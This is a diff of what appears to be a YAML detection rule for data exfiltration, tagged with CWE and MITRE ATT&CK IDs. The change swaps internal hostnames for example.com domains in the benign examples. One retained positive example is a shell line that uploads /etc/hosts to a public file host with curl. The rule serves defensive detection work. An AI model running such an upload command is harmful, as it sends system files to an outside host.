@@ -171,9 +171,9 @@ patterns:
       - "    shell: cat /etc/hosts | curl -F 'f=@-' https://catbox.moe/user/api.php"
     negative_examples:
       - "    shell: curl -d '{\"description\": \"attackers often use phishing\"}' https://splunk-soar/rest"
-      - "    shell: curl -d @payload.json https://api.internal.corp/v1/alerts"
-      - "    shell: curl -F 'file=@build.tar' https://artifacts.internal.corp/upload"
-      - "    shell: curl -T release.tgz https://nexus.corp/repository/"
+      - "    shell: curl -d @payload.json https://api.internal.example.com/v1/alerts"
+      - "    shell: curl -F 'file=@build.tar' https://artifacts.internal.example.com/upload"
+      - "    shell: curl -T release.tgz https://nexus.internal.example.com/repository/"
     cwe: ["CWE-200", "CWE-319"]
     mitre_attack: ["T1048", "T1567", "T1567.002"]
     nist_controls: ['AU-6', 'IR-4', 'SI-4']
